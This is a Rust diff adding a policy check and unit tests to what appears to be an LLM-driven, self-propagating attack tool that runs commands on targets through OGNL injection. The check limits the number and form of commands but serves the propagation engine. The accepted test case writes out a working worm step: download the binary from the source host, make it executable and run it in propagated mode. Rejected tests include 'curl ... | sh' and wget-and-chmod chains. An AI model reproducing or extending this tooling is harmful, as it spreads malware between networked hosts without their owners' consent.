@@ -118,6 +118,14 @@ impl PolicyGate {
                         .to_string(),
                 };
             }
+            if let Err(rule) = self.validate_ognl_exec_actions(plan) {
+                return PolicyDecision::Rejected {
+                    reason: PolicyRejectionReason::Custom(
+                        "OgnlExec action failed policy validation".into(),
+                    ),
+                    rule,
+                };
+            }
         }
 
         PolicyDecision::Accepted
@@ -136,6 +144,44 @@ impl PolicyGate {
             BootstrapAction::ScpPullFromSource { secret_ref, .. } => !secret_ref.key_id.is_empty(),
             _ => true,
         })
+    }
+
+    /// Validate OgnlExec actions in a bootstrap plan before execution.
+    ///
+    /// Returns `Ok(())` when all checks pass, or `Err(rule_string)` describing
+    /// the first violation. Two invariants are enforced at the policy layer so
+    /// violations are caught before any network activity:
+    ///
+    /// 1. `commands.len() <= MAX_COMMANDS` — prevents unbounded LLM-generated loops.
+    /// 2. No shell operators per element — freemarker.Execute tokenizes by whitespace;
+    ///    operators would silently corrupt the command rather than chain it.
+    fn validate_ognl_exec_actions(&self, plan: &crate::types::BootstrapPlan) -> Result<(), String> {
+        const MAX_COMMANDS: usize = 10;
+        // `>` and `<` are excluded: `<source_ip>` is a legitimate placeholder, and
+        // freemarker.Execute calls Runtime.exec() directly — not a shell interpreter.
+        const SHELL_OPERATORS: &[&str] = &["&&", "||", ";", "|", "`", "$("];
+
+        for step in &plan.steps {
+            if let BootstrapAction::OgnlExec { commands, .. } = &step.action {
+                if commands.len() > MAX_COMMANDS {
+                    return Err(format!(
+                        "OgnlExec has {} commands; MAX_COMMANDS={}",
+                        commands.len(),
+                        MAX_COMMANDS
+                    ));
+                }
+                for (i, cmd) in commands.iter().enumerate() {
+                    for op in SHELL_OPERATORS {
+                        if cmd.contains(op) {
+                            return Err(format!(
+                                "OgnlExec cmd[{i}] contains shell operator '{op}'"
+                            ));
+                        }
+                    }
+                }
+            }
+        }
+        Ok(())
     }
 
     /// Build a `RejectedStrategy` record to feed back into the next LLM query.
@@ -405,6 +451,122 @@ mod tests {
                 reason: PolicyRejectionReason::InvalidSecretReference,
                 ..
             }
+        ));
+    }
+
+    // ── OgnlExec policy validation (MAX_COMMANDS + shell operator checks) ─────
+
+    fn ognl_step(commands: Vec<&str>) -> BootstrapStep {
+        BootstrapStep {
+            action: BootstrapAction::OgnlExec {
+                commands: commands.iter().map(|s| s.to_string()).collect(),
+                port: Some(8080),
+                path_prefix: None,
+                extra_headers: vec![],
+            },
+            target: "10.0.0.5".into(),
+            timeout_ms: 5000,
+            requires_root: false,
+            expected_result: ExpectedResult {
+                success_indicator: "".into(),
+                failure_indicator: None,
+            },
+        }
+    }
+
+    fn strategy_with_ognl(commands: Vec<&str>) -> PropagationStrategy {
+        let mut s = strategy(
+            PropagationMethod::Http {
+                path: "/".into(),
+                http_method: crate::types::HttpMethod::Post,
+                headers: vec![],
+                port: Some(8080),
+            },
+            0.9,
+        );
+        s.bootstrap_plan = Some(BootstrapPlan {
+            steps: vec![ognl_step(commands)],
+        });
+        s
+    }
+
+    #[test]
+    fn accepts_ognl_exec_with_valid_commands() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        let s = strategy_with_ognl(vec![
+            "wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum-maze",
+            "chmod +x /tmp/physarum-maze",
+            "nohup /tmp/physarum-maze --mode propagated &",
+        ]);
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.0.5".parse().unwrap(), 1),
+            PolicyDecision::Accepted
+        ));
+    }
+
+    #[test]
+    fn rejects_ognl_exec_exceeding_max_commands() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        // 11 commands exceeds MAX_COMMANDS=10
+        let cmds: Vec<&str> = (0..11).map(|_| "id").collect();
+        let s = strategy_with_ognl(cmds);
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.0.5".parse().unwrap(), 1),
+            PolicyDecision::Rejected {
+                reason: PolicyRejectionReason::Custom(_),
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn rejects_ognl_exec_with_and_operator() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        let s = strategy_with_ognl(vec!["wget http://10.0.0.1/x && chmod +x /tmp/x"]);
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.0.5".parse().unwrap(), 1),
+            PolicyDecision::Rejected {
+                reason: PolicyRejectionReason::Custom(_),
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn rejects_ognl_exec_with_pipe_operator() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        let s = strategy_with_ognl(vec!["curl http://10.0.0.1/x | sh"]);
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.0.5".parse().unwrap(), 1),
+            PolicyDecision::Rejected {
+                reason: PolicyRejectionReason::Custom(_),
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn rejects_ognl_exec_with_semicolon() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        let s = strategy_with_ognl(vec!["id; whoami"]);
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.0.5".parse().unwrap(), 1),
+            PolicyDecision::Rejected {
+                reason: PolicyRejectionReason::Custom(_),
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accepts_exactly_max_commands() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        // Exactly 10 commands — must be accepted
+        let cmds: Vec<&str> = (0..10).map(|_| "id").collect();
+        let s = strategy_with_ognl(cmds);
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.0.5".parse().unwrap(), 1),
+            PolicyDecision::Accepted
         ));
     }
 }
